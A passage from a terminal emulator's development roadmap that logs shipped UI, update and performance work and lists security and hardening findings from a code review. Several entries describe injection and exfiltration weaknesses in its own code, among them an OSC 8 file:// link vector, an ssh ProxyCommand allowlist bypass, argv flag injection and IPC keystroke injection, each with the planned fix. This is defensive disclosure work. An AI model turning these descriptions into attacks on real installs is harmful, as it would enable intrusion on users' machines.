  before. Low-risk one-handler change; confirmed it fails cleanly
  against pre-fix source before locking. Locked by
  `tests/features/tab_rename_pin` (4 invariants: lambda calls
  `setTabTitleForRemote(…)`, no direct `setTabText`, empty-name
  path not guarded out, consumer-side `m_tabTitlePins.contains(…)`
  guards still present on both consumers).

### 🎨 Claude Code UX — background-tasks status-bar surface (user request 2026-04-25)

- ✅ **Claude Code background-tasks button.** Shipped 0.7.38. User
  ask: "a button on the status bar when there are background tasks
  being run. We then click the button to view what Claude Code
  shows for the background tasks. The button opens a dialog showing
  the live update info on the background tasks." New
  `ClaudeBgTaskTracker` (`claudebgtasks.{h,cpp}`) parses the active
  session's transcript JSONL for `tool_use` blocks whose
  `input.run_in_background == true` and correlates them with
  `tool_result` blocks carrying `toolUseResult.backgroundTaskId`
  (which embeds the on-disk
  `/tmp/claude-$UID/.../<id>.output` path). Completion / kill state
  is derived from subsequent `BashOutput` results carrying
  `status: "completed" | "killed" | "failed"` and from `KillShell`
  tool calls. `MainWindow` adds a sibling-of-Review-Changes
  `m_claudeBgTasksBtn`, hidden when `runningCount() == 0`,
  re-targeted on tab switch via `refreshStatusBarForActiveTab` so
  each tab's session drives its own count independently.
  `ClaudeBgTasksDialog` (`claudebgtasksdialog.{h,cpp}`) is the
  live-tail dialog, mirroring the 0.7.37 Review Changes update
  model — `QFileSystemWatcher` on each task's `.output` plus the
  transcript, 200 ms debounce, skip-identical-HTML guard,
  capture-vbar-before-`setHtml` + restore-after with `qMin(...,
  maximum())` clamp, and a "was-at-bottom" pin so live appends
  stay visible. Locked by
  `tests/features/claude_bg_tasks_button/` (10 invariants —
  source-grep harness, no Qt link).

- ✅ **Background-tasks button scopes to the active tab's project.**
  Shipped 0.7.44. User feedback 2026-04-27: "For the background
  tasks dialog, please ensure that it only references the
  background tasks for that project, not all projects." Previously
  `ClaudeIntegration::activeSessionPath()` walked
  `~/.claude/projects/` system-wide and returned the most-recently-
  modified `.jsonl`, which meant a busy session in one project's
  window would surface its bg-tasks count on a sibling window
  pointed at a different project. The method now accepts a
  `projectCwd` argument; the active tab's `shellCwd()` is encoded
  via `encodeProjectPath` and the helper walks up the cwd
  (`cdUp`) probing each ancestor's `~/.claude/projects/<encoded>/`
  subdir, returning the deepest match's newest `.jsonl`. Empty
  `projectCwd` falls back to the system-wide newest (kept for
  callers that genuinely want it; nothing in tree currently does).
  Locked by `tests/features/claude_bg_tasks_button/` extended from
  10 → 11 invariants — INV-11 source-greps the header signature,
  the implementation walk-up logic (`encodeProjectPath` + `cdUp`),
  and the call-site wiring through
  `focusedTerminal()->shellCwd()`.

### 🎨 Claude Code UX — unified state-dot palette (user request 2026-04-27)

- ✅ **Single round dot per tab, colour-only differentiation, palette
  extended to status bar.** Shipped 0.7.39. User ask: "a round dot
  on each tab that has a Claude Code session running (no icons or
  anything else other than the tab label). The dot will change
  colour with the various states that Claude Code is in. Each state
  has its own colour (grey for idle). Then extend those colours to
  the status bar Claude Code status too." New static helper
  `ClaudeTabIndicator::color(Glyph)` in `coloredtabbar.h` is the
  single source of truth for an eight-state palette: Idle `#888888`
  (grey, per user spec), Thinking `#5BA0E5` (blue), ToolUse
  `#E5C24A` (yellow), Bash `#6FCF50` (green), Planning `#5DCFCF`
  (cyan), Auditing `#C76DC7` (magenta), Compacting `#A87FE0`
  (violet), AwaitingInput `#F08A4B` (orange). Red is intentionally
  absent — AwaitingInput is a normal interaction state, not an
  error. `ColoredTabBar::paintEvent` calls the helper for fill
  colour and now uses a single `kDotRadius = 4` for every state
  (the prior AwaitingInput "radius 5 + white outline" treatment is
  gone — colour alone is the differentiator, per "no icons or
  anything else other than the tab label"). `MainWindow::
  applyClaudeStatusLabel` was rewired to map current state →
  Glyph → colour through the same helper, replacing the prior
  `Theme::ansi[N]` mappings (which made the status-bar colour drift
  from the tab dot's colour and varied across themes). Auditing —
  previously surfaced only on the active-tab status bar — is now
  plumbed into `ClaudeTabTracker::ShellState::auditing` and lights
  the per-tab dot magenta on whichever tab's transcript has
  `/audit` in flight, tooltip "Claude: auditing". Precedence
  unchanged across the two surfaces: AwaitingInput → Planning →
  Auditing → state-derived. Locked by
  `tests/features/claude_state_dot_palette/` (8 invariants —
  source-grep harness, no Qt link, asserts helper signature, full
  palette, paintEvent helper-call, uniform geometry, mainwindow
  wiring, auditing plumbing).

### 🎨 Status-bar Roadmap viewer (user request 2026-04-27)

- ✅ **Status-bar Roadmap button + filterable live-tail dialog.**
  Shipped 0.7.39. User ask: "a button on the status bar to view the
  roadmap. So, it brings up a dialog showing the roadmap. It should
  have filters as well to show what is outstanding and what is
  completed if the user wants to use the filters. If at all
  possible, it should also highlight what item is being done
  currently." Follow-up: "the roadmap button should only show if
  there is roadmap documentation. Let's simplify that to requiring
  a roadmap.md file only. The user should follow norms for the
  roadmap button to show." Plus a clarification adding a fourth
  emoji toggle and elevating "Currently being tackled" to a
  peer filter. New `RoadmapDialog` (`roadmapdialog.{h,cpp}`)
  parses ROADMAP.md line-by-line into themed HTML with 5 peer
  category checkboxes (✅ Done · 📋 Planned · 🚧 In progress ·
  💭 Considered · Currently being tackled). All default-checked;
  combined inclusively (a bullet renders iff ANY enabled category
  matches). Plain narration bullets without status emojis always
  render. The "Currently being tackled" signal set is built from
  `CHANGELOG.md` `[Unreleased]` block + the last 5
  non-release/merge/revert git commit subjects, fuzzy-matched
  (lowercase, hyphens-as-spaces, punctuation-stripped) against
  bullet payloads. Matched bullets get a yellow left-border CSS
  highlight (`border-left: 4px solid #E5C24A` — the new ToolUse
  yellow from the dot palette, intentionally consistent across the
  two surfaces). Live updates: `QFileSystemWatcher` on
  ROADMAP.md + CHANGELOG.md, 200 ms debounce, the same
  scroll-preservation triple shipped with 0.7.37 / 0.7.38
  (capture vbar before `setHtml`, restore with `qMin(saved,
  maximum())` clamp, was-at-bottom pin). Button visibility is
  per-tab: `MainWindow::refreshRoadmapButton` (called from the
  central `refreshStatusBarForActiveTab` tick) probes the active
  tab's `shellCwd()` for any case-variant of `ROADMAP.md` and
  shows/hides accordingly — terminals running outside any project
  root pay nothing. Locked by `tests/features/roadmap_viewer/`
  (10 invariants — links the dialog source so the static
  `renderHtml` helper can be driven against synthetic markdown,
  asserts five-bit filter semantics, the highlight CSS marker on
  signal match, the marker's absence on empty signal sets, the
  case-insensitive cwd probe, and the wire-up shape).

- ✅ **Roadmap viewer polish — Close button fix + dynamic TOC sidebar.**
  Shipped 0.7.43. User feedback 2026-04-27: "I love the roadmap
  button / dialog. The 'X Close' button does nothing when clicked
  though. Also, I would like a navigation bar added to jump to
  various sections of the readme. This needs to be dynamic across
  projects please." Two fixes in one bundle: (1) the standard
  `QDialogButtonBox::Close` button under some Qt 6 builds doesn't
  emit `rejected()` reliably — wire `clicked` directly on the
  underlying `QPushButton` retrieved with
  `button(QDialogButtonBox::Close)`, keeping `rejected()` as a
  belt-and-braces fallback; (2) add a `QSplitter(Qt::Horizontal)`
  with a left-side `QListWidget` (`objectName "roadmap-toc"`)
  rebuilt from the markdown's `# `..`#### ` headings on every
  refresh — entries are flat, indented two spaces per level above 1,
  level-1 bold; click/activate → `m_viewer->scrollToAnchor(anchor)`.
  `RoadmapDialog::renderHtml` now prepends
  `<a name="roadmap-toc-N">` before each heading; the matching
  `extractToc(markdown)` pure helper returns
  `QVector<{level, text, anchor}>` so both walks share an index.
  `QTextEdit` → `QTextBrowser` for `scrollToAnchor` support; links
  pinned non-navigable. Locked by `tests/features/roadmap_viewer/`
  extended from 10 → 14 invariants (INV-11 extractToc shape, INV-12
  anchor-before-heading emission, INV-13 splitter+TOC+scrollToAnchor
  source-grep, INV-14 direct `QAbstractButton::clicked` Close-button
  connect).

### 🎨 GitHub-aware status bar (user requests 2026-04-27)

- ✅ **Public/Private repo badge + clickable update notifier.**
  Shipped 0.7.45. Two user requests bundled together — "Can we
  also have the status bar inform whether the repo is a public or
  a private repo?" and "Can we add an auto-update feature?". Both
  surface as small `QLabel` widgets on the status bar, both
  hide-when-not-applicable, both source GitHub state. The repo
  badge is per-tab (mirrors Roadmap button lifecycle via
  `refreshStatusBarForActiveTab` → new `refreshRepoVisibility`):
  walks the active tab's `shellCwd()` up for a `.git` ancestor,
  parses `[remote "origin"] url` from `.git/config` (handles both
  `https://github.com/owner/repo` and `git@github.com:owner/repo`
  forms), then runs `gh repo view <owner>/<repo> --json
  visibility -q .visibility`. Result is cached by repo root with
  a 10-minute TTL. The update notifier is global (one badge per
  running binary): a `QTimer` ticks every hour firing
  `checkForUpdates`, which hits
  `api.github.com/repos/milnet01/ants-terminal/releases/latest`
  via `QNetworkAccessManager`, strips the `v` from `tag_name`,
  and compares against `ANTS_VERSION` via a new pure
  `compareSemver` helper that splits on `.` and compares
  components as integers. A 5-second `singleShot` fires the first
  check on startup so the badge surfaces before the first hourly
  tick. New helpers in an anonymous namespace inside
  `mainwindow.cpp`: `findGitRepoRoot`, `parseGithubOriginSlug`,
  `compareSemver`. Locked by `tests/features/github_status_bar/`
  (12 invariants — label declaration/construction/object-name/
  hidden-default state, helper presence, both URL-form handling,
  `refreshStatusBarForActiveTab` wiring, four hide-on-failure
  branches in `refreshRepoVisibility`, the 10-minute cache TTL,
  the minimal `gh` invocation, the 60-min timer + 5 s singleShot,
  the releases/latest URL + User-Agent header,
  `setOpenExternalLinks(true)`, component-wise integer
  comparison in `compareSemver`). **Out of scope for this release:
  the actual binary auto-update via AppImageUpdate / zsync** — a
  follow-up release that needs the build workflow to publish a
  `.zsync` sidecar and embed the `gh-releases-zsync|...`
  update-information string in linuxdeploy. Cannot retroactively
  update binaries shipped without the metadata. This release only
  notifies.
- ✅ **Update check cadence + pre-update warning dialog.**
  Shipped 0.7.47. Two pieces of user feedback 2026-04-27 bundled:
  (1) "An hourly check I think is a bit much. Let's do the check
  when the terminal is opened and when the user clicked on
  Help > Check for Updates." (2) "Before an update is processed,
  it should warn the user that it will be restarting the
  terminal. Any Claude Code sessions currently running will need
  to be reconnected." Cadence: removed `m_updateCheckTimer` (the
  hourly `QTimer`); kept the 5-second startup `singleShot`;
  added `Help → Check for Updates` action (objectName
  `helpCheckForUpdatesAction`) for manual re-check.
  `checkForUpdates(bool userInitiated = false)` — manual triggers
  surface "Up to date — running v0.7.47 (latest)" / "Update check
  failed: <err>" status messages, startup probes stay silent.
  Pre-update dialog: `handleUpdateClicked` now constructs a
  `QMessageBox` *before* `QProcess::startDetached` explaining
  that AppImageUpdate writes the new release alongside, that the
  user must quit and re-launch to use it, and that active Claude
  Code sessions will be disconnected and need to be reconnected.
  Cancel short-circuits the spawn. Locked by
  `tests/features/github_status_bar/` extended 16 → 17
  invariants. INV-9 revised, INV-17 added.
- ✅ **AppImageUpdate / zsync auto-update.** Shipped 0.7.46.
  Phase B of the auto-update story (Phase A was the notifier in
  0.7.45). Two changes: (1) `.github/workflows/release.yml` now
  passes
  `UPDATE_INFORMATION="gh-releases-zsync|milnet01|ants-terminal|latest|Ants_Terminal-*-x86_64.AppImage.zsync"`
  to the linuxdeploy invocation, which embeds the update-info ELF
  note into the AppImage AND produces a `<output>.zsync` sidecar
  alongside it; the upload step uploads BOTH to the release.
  (2) `MainWindow::handleUpdateClicked` is now wired to the update
  label's `linkActivated` signal (`setOpenExternalLinks(false)`).
  It probes for `AppImageUpdate` (GUI) first, `appimageupdatetool`
  (CLI) second; reads `$APPIMAGE` to find the on-disk path; runs
  the updater detached via `QProcess::startDetached`. Falls back
  to `QDesktopServices::openUrl` only when neither tool is
  installed or the binary isn't running as an AppImage. v0.7.46
  is the **first release whose binary can be updated in place** —
  v0.7.45 and earlier shipped without the metadata and continue
  to be manual-download only (no way to retroactively add the ELF
  note). Test contract extended from 12 → 16 invariants in
  `tests/features/github_status_bar/` (INV-13 workflow embeds
  UPDATE_INFORMATION, INV-14 uploads `.zsync` sidecar, INV-15
  handler probes both updater names + reads `$APPIMAGE` + falls
  back to QDesktopServices, INV-16 detached spawn via
  `QProcess::startDetached`).

### 🐜 Tab UX

- ✅ **Tab close button (×) always visible, not hover-only.**
  Shipped 0.7.32. Replaced the platform-style fallback (0.6.27)
  with explicit data-URI SVG `image: url(...)` rules in both the
  default and `:hover` `QTabBar::close-button` stylesheet
  variants. Glyph re-tints with the active theme via
  `theme.textSecondary` (default) / `theme.textPrimary` (hover);
  hover keeps the ansi-red `background-color` will-click cue.
  Locked by `tests/features/tab_close_button_visible/` — 11
  invariants on data-URI presence, two-line × shape, the
  `QStringLiteral("%23") + name().mid(1)` arg-side splice (which
  prevents Qt's CSS parser from truncating the URI at the
  fragment delimiter), and image presence in BOTH state rules.
  User feedback 2026-04-25.

### ⚡ / 🏗 Tier 3 — structural

- ✅ **VtParser `Print`-run coalescing.** Shipped 0.7.17. The SIMD
  fast-path now emits one `VtAction::Print` per safe-ASCII run
  carrying a `{printRun, printRunLen}` slice into the caller buffer.
  `TerminalGrid::handleAsciiPrintRun` batches per-row cell writes so
  `markScreenDirty`, combining-char erase, and the `cell()` clamp
  fire once per row instead of once per byte. Measured deltas on
  8 MiB bench corpora (lower is better): `ascii_print` 327 → 260 ms
  (−20% wall, +26% MB/s), `ansi_sgr` 291 → 255 ms (−12% wall, +14%
  MB/s). The ROADMAP-target 5–10× never materialized because the
  remaining per-byte cost is in the cell-write path
  (`memmove`-style row updates, scrollback, attribute assignment),
  not in VtAction construction. `newline_stream` and `utf8_cjk`
  unchanged — no safe-ASCII runs or no coalesce-applicable path.
  Lifetime invariant enforced: `VtStream::onPtyData` expands runs
  into per-byte Prints before queuing (batch outlives feed buffer);
  the direct-callback path keeps the coalesced form. Locked by
  `tests/features/vtparser_print_run_coalesce` (8 invariants over
  grid-state equivalence vs. the scalar byte-by-byte feed).
- ✅ **Scroll region perf: `std::rotate` for `scrollUp`/`scrollDown`.**
  Shipped 0.7.40. `TerminalGrid::scrollUp` and `scrollDown`
  replaced their per-iteration `erase`+`insert` loop with a single
  `std::rotate` call over `[scrollTop, scrollBottom]` plus a
  pool-salvage / scrollback-push pre-pass and a fresh-blank
  post-pass. The CSI 2J doubling-guard window check moves from
  per-iteration to once-per-batch (elapsed time is microseconds
  across the batch — same observable behaviour). Hyperlinks rotate
  with the rows; scrollback cap pop_front loops once at the end of
  the batch instead of N times. `CSI 100 S` on an 80-row screen
  drops from O(count × rows) memmoves to O(rows). All eight
  invariants in `tests/features/scroll_region_rotate/` stay green
  (rotation behaviour was already pinned by the spec; this commit
  was an algorithm swap behind that contract).
- ✅ **`VtBatch` zero-copy across thread hop.** Shipped 0.7.40.
  Introduced `using VtBatchPtr = std::shared_ptr<const VtBatch>;`
  and changed `VtStream::batchReady` from `void(const VtBatch &)`
  to `void(VtBatchPtr)`. `flushBatch` and `onPtyFinished` build
  the batch via `std::make_shared<VtBatch>()` and emit the
  smart-pointer; Qt's queued connection now copies a 16-byte
  shared_ptr (atomic refcount bump) across the worker→GUI hop
  instead of deep-copying the `actions` vector + `rawBytes`
  QByteArray (tens of KB per batch on noisy bursts × hundreds
  of batches/sec). `TerminalWidget::onVtBatch` updated to
  pointer-deref. Behavioural equivalence preserved — the
  `threaded_parse_equivalence` test (action-stream identity)
  stays green. Locked additionally by
  `tests/features/vtbatch_zero_copy/` (5 source-grep invariants
  on the carrier shape, alias declaration, make_shared emit
  sites, pointer-deref receiver, and metatype registration).
- ✅ **Renderer subsystem decision: deleted glrenderer.cpp.** Shipped
  0.7.44. The dormant GPU-accelerated glyph-atlas renderer
  (`src/glrenderer.{h,cpp}`, ~900 LoC) had been compiled-but-
  unreachable since 0.7.4 — `TerminalWidget` switched to a plain
  `QWidget` that paints via `QPainter`, leaving the GL-atlas path
  with no live caller. Reviving via `createWindowContainer` would
  have required fixing the GlyphQuad UV-math bug, restoring GL
  state on render exit, HiDPI / `devicePixelRatio` handling, and a
  premultiplied-alpha pipeline — none of which paid for themselves
  while the QPainter+QTextLayout path remained fast enough for
  every shipped corpus. Resolution: delete. Removed
  `src/glrenderer.{h,cpp}`, the `gpu_rendering` Config key, the
  `Config::gpuRendering` / `setGpuRendering` getters/setters, the
  Settings → Appearance "GPU rendering (glyph atlas + GLSL
  shaders)" checkbox, the View → "GPU Rendering" menu action, the
  `m_glRenderer` / `m_gpuRendering` members on `TerminalWidget`,
  and the `setGpuRendering(bool)` / `gpuRendering()` accessors.
  Settings-restore-defaults spec updated to drop the no-longer-
  present `gpuRendering off` clause. Existing config files with a
  stale `gpu_rendering: true` key are silently ignored — Config
  doesn't validate unknown keys. User-visible payoff: the
  Settings checkbox + View menu item used to write the bool but
  do nothing; both are gone, so the chrome no longer lies about
  its own functionality.
- ✅ **Settings dialog: dependency-UI enable gating.** Shipped
  0.7.32. AI tab fields (endpoint/key/model/context-lines)
  disabled when `m_aiEnabled` is unchecked; dark/light theme
  combos disabled when `m_autoColorScheme` is unchecked; Quake
  hotkey + portal-status label disabled when `m_quakeMode` is
  unchecked. Locked by `tests/features/settings_dependency_gating/`
  — 16 invariants on toggled-wiring + one-shot sync calls.
- ✅ **Settings dialog: Cancel rollback for Profiles tab.**
  Shipped 0.7.32. Profile Save/Delete/Load now stage edits in
  `m_pendingProfiles` + `m_pendingActiveProfile`; `applySettings`
  is the single commit point. Cancel discards staged edits the
  same way every other tab does. Locked by
  `tests/features/settings_profile_cancel_rollback/` — 11
  invariants including the global "single setProfiles call site"
  check that catches a regression where a Save/Delete callback
  starts writing to m_config directly again.
- ✅ **Settings dialog: Restore Defaults per-tab.** Shipped
  0.7.32. Each primary tab (General, Appearance, Terminal, AI)
  has a "Restore Defaults (<TabName> tab)" button with stable
  objectName. Reset slots mutate widgets only — Cancel rolls
  back the reset along with any other in-dialog edits. Locked
  by `tests/features/settings_restore_defaults/` — 22
  invariants on objectNames + reset-value coverage + no-direct-
  config-write.
- ✅ **Accessibility pass on chrome.** Shipped 0.7.41. Every
  glyph-only chrome control now carries an explicit
  `setAccessibleName` + `setAccessibleDescription` set immediately
  after `setText`. TitleBar's four window controls (`centerBtn`
  "Center window", `minimizeBtn` "Minimize window", `maximizeBtn`
  "Maximize window", `closeBtn` "Close window") and the
  CommandPalette's two controls (`commandPaletteInput`
  "Command palette search", `commandPaletteList`
  "Command palette results") are covered. Status-bar push buttons
  with English labels (`Background Tasks`, `Roadmap`,
  `Review Changes`) are out of scope: they inherit their accessible
  name from `text()` via Qt's `QAccessibleButton` adapter.
  `tr()` translation hooks deferred to 0.9.0 H10 i18n bundle so
  `.qm` files cover both UI text and a11y strings in one pass. Locked
  by `tests/features/a11y_chrome_names/` (eight invariants).
- ✅ **AT-SPI introspection lane.** Shipped 0.7.41 as part of the
  same bundle. `tests/features/a11y_chrome_names/` walks the
  TitleBar + CommandPalette widget trees under
  `QT_QPA_PLATFORM=offscreen` and asserts every reachable
  `QAbstractButton` carries either a non-empty `accessibleName()`
  or a non-empty `text()`, and every reachable `QLineEdit` has an
  explicit `accessibleName()`. A future contributor adding a
  glyph-only chrome button without a name fails this test. Custom
  `QAccessibleInterface` for `TerminalWidget` (the H9 a11y bundle)
  remains separate, target 0.9.0.

### 📚 Sweep methodology — re-run before each minor tag

Adopt the following as a standing pre-release step:

1. Re-dispatch the 14-agent sweep via
   `general-purpose` subagents (one per subsystem listed in
   `CLAUDE.md`'s "Project Structure"), briefed with source paths +
   `CLAUDE.md` + `PLUGINS.md` + matching `tests/features/*/spec.md` +
   relevant external specs. Cost: ~15 subagent runs (~1 M tokens total
   for a full sweep).
2. Triage the HIGH/Medium findings into this ROADMAP under the active
   minor's section.
3. Anchor every regression test added during the fix cycle to an
   **external** signal (spec section, CVE, reviewer report), not the
   author's own reasoning. See the "Spec-first workflow" note below.

**Spec-first workflow for new features (starting with the first
Tier 1 fix):** write `tests/features/<name>/spec.md` *before* the
code, surface it to the user for sign-off, then implement. The
feature test validates the user-approved spec, not the author's
interpretation. Closes the self-graded-homework loop.

### 🧪 Future external-signal lanes (carry from the 2026-04-23 review)

- 📋 [ANTS-1003] **vttest as a CI lane.** Thomas Dickey's public xterm test
  program. Highest signal-per-effort for VT conformance drift.
  Runs a canonical xterm-compliance corpus against our parser; any
  divergence is a finding anchored to a published spec.
- 📋 [ANTS-1004] **Differential screen-dump harness vs xterm/kitty.** Send a
  canonical byte-stream corpus to each, capture final screen state,
  diff. Divergences are findings regardless of what our unit tests
  say.
- 📋 [ANTS-1005] **libFuzzer target against `VtParser`.** Feed random bytes,
  assert invariants (no crash, cursor bounded, scrollback bounded,
  combining side-table aligned). Mechanical — surfaces cases the
  author can't imagine.
- 📋 [ANTS-1006] **Real-TUI smoke lane.** `vim`, `tmux`, `htop`, `neovim` in a
  headless session, snapshot screen, compare across releases.

---

## 0.7.50 — independent-review sweep (target: 2026-05)

**Theme:** fold-in of the 2026-04-27 multi-agent code review (post-0.7.49).
Eleven independent `general-purpose` subagents dispatched in parallel —
one per subsystem — each briefed only with source paths + contract docs +
external standards (ECMA-48, xterm ctlseqs, POSIX `forkpty(3)`, Lua 5.4
manual, OWASP LLM Top 10, SARIF v2.1.0, RFC 8259, freedesktop GlobalShortcuts
portal, WCAG 2.2). Agents had **zero context on implementation reasoning** —
code reviewed against contracts, not intent.

The sweep produced 14 CRITICAL/HIGH cross-cutting findings plus ~40 medium
hardening items. The cross-cutting themes are the gold signal — patterns
flagged by ≥2 independent reviewers regardless of which lane:

### 🔥 Cross-cutting themes (≥2 reviewers)

- 📋 [ANTS-1007] **Atomic-write / data-loss drift.** The `QFile::rename` anti-pattern
  Config retired once is unfixed in `SessionManager::saveSession` +
  `saveTabOrder` and in the `auditdialog.cpp` SARIF/HTML export.
  Lanes: Config, Audit.
- 📋 [ANTS-1008] **frameless+translucent `exec()` regression class is back.**
  0.7.49 retired this for both About dialogs; the 0.7.47
  update-confirmation `QMessageBox box(this); box.exec()` reintroduces
  the same shape on the same MainWindow. Lanes: MainWindow, AI/dialogs.
- 📋 [ANTS-1009] **Missing argv `--` separator / quote-aware tokenisation.**
  `git blame -- f.file` separator missing, ssh `extraArgs` quote-bypass
  on `-o` allowlist, `openFileAtPath` doesn't `--`-separate captured
  paths starting with `-`. Lanes: Audit, AI/dialogs, TerminalWidget.
- 📋 [ANTS-1010] **Permission allow-list / intersect missing.** Lua plugin
  manifest accepts any permission string, prompt result not
  intersected with requested set. SSH `-o` allowlist same shape.
  Lanes: Lua, AI/dialogs.
- 📋 [ANTS-1011] **Color-only state encoding (WCAG 1.4.1).** Per-tab Claude state
  dot, status-bar Claude label, chrome QLabels — no shape variation,
  no `accessibleDescription`. Lanes: Chrome widgets, Claude integration,
  MainWindow.
- 📋 [ANTS-1012] **Unbounded reads / OOM corner cases.** `extractCwdFromTranscript`
  unbounded `readLine`, AI SSE parser blocks event loop on big chunks,
  Roadmap dialog reads entire file unbounded. Lanes: Claude integration,
  AI/dialogs.
- 📋 [ANTS-1013] **2 s status-timer redundant work.** 0.7.49 bg-tasks fix forces
  full 16 MiB transcript reparse every tick on a quiet session;
  `refreshReviewButton` spawns `git status` `QProcess` every 2 s with
  no in-flight de-dup. Lanes: Claude integration, MainWindow.
- 📋 [ANTS-1014] **No clipboard-write redaction helper.** 7th-audit memory flagged
  this; TerminalWidget has 12 raw `setText` sites. OSC 52 callback is
  the headline exfil vector. Lanes: TerminalWidget.

### 🐛 Regressions reported post-0.7.49 (user, 2026-04-27)

- ✅ **HIGH — GitHub repo-type chip (Public/Private) not showing
  at all.** Resolved as of 2026-04-28 (user confirmed via screenshot
  showing the "Public" badge alongside the `main` branch chip on the
  status bar's left side). The chip became visible after the 0.7.50
  / 0.7.51 release cycle landed; the original suspicion (placement-
  move regression hiding the widget) didn't manifest in the running
  build once chrome ordering settled. No source change needed beyond
  what already shipped. `tests/features/github_status_bar/` still
  asserts the call shape but does not check runtime visibility —
  worth extending the next time the GitHub-status-bar lane is
  touched (deferred to T2 hardening, separate item).
- ✅ **HIGH — Status-bar transient notification stuck on "Config
  reloaded from disk".** Shipped in 0.7.51 — root cause was the
  config-watcher firing in a tight loop (the second of the two
  hypotheses in the original entry). `Config::setTheme` rewrote the
  watched file even when the value matched, so any
  `applyTheme(m_config.theme())` from inside `onConfigFileChanged`
  re-entered via inotify after `blockSignals(false)` released. Fix
  made `setTheme` idempotent + added an `m_inConfigReload` re-entrancy
  guard with deferred clear via `QTimer::singleShot(0, ...)`. See
  CHANGELOG 0.7.51 and `tests/features/config_reload_loop_safety/`.

### 🔒 Tier 1 — ship-this-week (security / data-loss / shipped-broken)

- 📋 [ANTS-1015] **CRITICAL — Update-confirmation dialog same KDE/KWin frameless
  regression.** `mainwindow.cpp:5264-5280` `QMessageBox box(this);
  box.exec();` — convert to heap+show+activateWindow mirroring the
  0.7.49 About-dialog pattern. User clicks Update, nothing happens,
  in-place updater never fires.
- 📋 [ANTS-1016] **CRITICAL — SessionManager silent data loss.**
  `sessionmanager.cpp:389, 454` `QFile::rename` refuses to overwrite
  existing destination — every save after the first leaves `.dat.tmp`
  accumulating; user's scrollback never updates. Switch to
  `std::rename` mirroring `config.cpp:139-174`. Wrap both in
  `ConfigWriteLock`; add corrupt-file rotation on `loadSession`
  failure.
- 📋 [ANTS-1017] **CRITICAL — SARIF/HTML export not atomic + no 0600 perms.**
  `auditdialog.cpp:3530-3554` uses raw `QFile::Truncate`; reports
  may contain leaked secrets surfaced by `secrets_scan`/gitleaks.
  Switch to `QSaveFile` + `setOwnerOnlyPerms`.
- 📋 [ANTS-1018] **HIGH — `new-tab` / `launch` IPC commands bypass `send-text` C0
  filter.** `remotecontrol.cpp:401, 422`. Same-UID attacker reaches
  keystroke-injection / OSC-52 primitives via a different command.
  Route both through `filterControlChars` with the same `raw: true`
  opt-out.
- 📋 [ANTS-1019] **HIGH — OSC 8 `file://` scheme in allowlist.**
  `terminalgrid.cpp:898`. `xdg-open file:///foo.desktop` is an exfil +
  RCE-adjacent vector. Drop `file:` (and `ftp:`).
- 📋 [ANTS-1020] **HIGH — ESC-in-OSC dispatches trailing byte as EscDispatch.**
  `vtparser.cpp:403`. Crafted OSC ending in `ESC c` triggers RIS as
  side-effect (full terminal reset). Add `OscStringEsc` peek state
  matching xterm's parser.
- 📋 [ANTS-1021] **HIGH — X10 mouse byte > 0xDF corrupts UTF-8 stream.**
  `terminalwidget.cpp:2668-2670` and `:1801-1809` (wheel). 224+col
  terminals on UTF-8-reading apps mis-frame. Clamp `col`/`row` to 223
  in X10 path.
- 📋 [ANTS-1022] **HIGH — Lua plugin permission allow-list + intersect missing.**
  `pluginmanager.cpp:87, 243`. Manifest accepts any string into
  `info.permissions`; prompt return not validated against the
  requested set. Add allow-list against `{"clipboard.write",
  "settings"}`; intersect prompt result.
- 📋 [ANTS-1023] **HIGH — `extractCwdFromTranscript` unbounded `readLine`.**
  `claudeintegration.cpp:981`. One-line fix: pass `64*1024` max-size
  to `readLine`. Removes 1 GiB single-line OOM corner case.
- 📋 [ANTS-1024] **HIGH — ssh `extraArgs` quote-bypass on `-o` allowlist.**
  `sshdialog.cpp:112`. `extraArgs.split(\\s+)` doesn't handle quoted
  `-o "ProxyCommand …"`; option allowlist silently bypassed. Replace
  with `QProcess::splitCommand`.

### 🔧 Tier 2 — hardening sweep

- 📋 [ANTS-1025] **Multi-row OSC 8 hyperlink span miscoded.** `terminalgrid.cpp:867`
  — wrapped hyperlinks store `endCol < startCol` because `m_cursorCol`
  is on the current row, not `m_hyperlinkStartRow`. Emit per-row spans
  on each newline / wrap during the active hyperlink.
- 📋 [ANTS-1026] **ITU/ECMA-48 colon-RGB form `38:2::r:g:b` drops a channel.**
  `vtparser.cpp:357` + `terminalgrid.cpp:1438`. Standards-compliant
  form has empty colorspace slot before R; current parser shifts
  the read window wrong. Reshape parser to track sub-parameter
  sub-arrays per param, not flat vector + parallel boolean.
- 📋 [ANTS-1027] **Image-paste `m_imagePasteDir` not path-validated; filename
  injected to PTY.** `terminalwidget.cpp:1439`. Hard-pin to
  user-home or canonicalize-and-reject-non-writable; use UUID4
  suffix to prevent millisecond-collision clobbers.
- 📋 [ANTS-1028] **`openFileAtPath` argv injection.** `terminalwidget.cpp:3286`
  — paths starting with `-` reach VS Code/etc as flags. Prepend
  `--` to args and `./` to any captured path that starts with `-`.
- 📋 [ANTS-1029] **Paste preview splits on LF only — CR-only payload spoofs
  the dialog.** `terminalwidget.cpp:2059, 2138`. Normalize CR→LF
  for preview only; keep original bytes for the actual write.
- 📋 [ANTS-1030] **`git blame` missing `--` argv terminator.**
  `auditdialog.cpp:2488`. `f.file` is scanner-controlled.
- 📋 [ANTS-1031] **comment-suppress regex breaks on hyphenated rule IDs.**
  `auditdialog.cpp:2268`. Terminator class includes `-` which
  collides with rule-id charset; `// nosemgrep: bash-c-non-literal`
  matches only `bash`. Replace terminator with `[)\]]|$|--`.
- 📋 [ANTS-1032] **Trend snapshot corrupted by UI filter clicks.**
  `auditdialog.cpp:4449`. `appendSnapshot` runs inside
  `renderResults` which is called on every severity-pill toggle.
  Move to single completion point in `runNextCheck`.
- 📋 [ANTS-1033] **bg-tasks: split liveness from full reparse.**
  `claudebgtasks.cpp` + `mainwindow.cpp:4920`. Add
  `sweepLiveness()` that walks `m_tasks` mtimes only; let the
  file watcher continue calling full `rescan`. Removes 16 MiB
  reparse per 2 s tick.
- 📋 [ANTS-1034] **WCAG 1.4.1 — Claude state dot is colour-only.**
  `coloredtabbar.cpp:130-151`. Add per-tab `setAccessibleDescription`
  wired to indicator changes, OR a shape-differentiated rendering.
- 📋 [ANTS-1035] **A11y — status-bar QLabels missing `setAccessibleName`.**
  `mainwindow.cpp` ~542+. Branch chip, repo-visibility, process,
  Claude state — screen readers announce raw text or Powerline
  glyph codepoint.
- 📋 [ANTS-1036] **`ClaudeBgTaskTracker::tasks()` returns by value on hot path.**
